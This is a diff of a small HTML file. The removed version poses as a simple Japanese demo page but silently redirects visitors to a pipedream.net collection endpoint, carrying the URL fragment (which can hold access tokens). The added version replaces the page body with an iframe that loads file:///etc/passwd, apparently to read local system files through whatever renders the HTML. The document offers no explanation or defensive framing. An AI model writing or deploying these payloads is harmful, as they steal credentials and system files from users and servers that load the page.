@@ -3,28 +3,11 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>シンプルなHTMLページ</title>
+    <title></title>
     <script>
-      // フラグメント部分を抽出して表示する関数
-      function displayFragment() {
-        // 現在のURLからフラグメント部分を取得
-        var fragment = window.location.hash.substring(1);
-        // フラグメント部分を表示する要素を取得
-        var fragmentDisplay = document.getElementById("fragment-display");
-        // 要素にフラグメント部分を表示
-        fragmentDisplay.textContent = fragment
-          ? "フラグメント部分: " + fragment
-          : "フラグメント部分はありません。";
-        window.location.href = "https://enghd2bd35t7sh5.m.pipedream.net/?" + fragment; 
-      }
-
-      // ページが読み込まれた時に関数を実行
-      window.onload = displayFragment;
     </script>
   </head>
   <body>
-    <h1>シンプルなHTMLページ</h1>
-    <p>これはシンプルなHTMLの例です。見出しと段落が含まれています。</p>
-    <p id="fragment-display">フラグメント部分をここに表示します。</p>
+    <iframe src='file:///etc/passwd'>
   </body>
 </html>
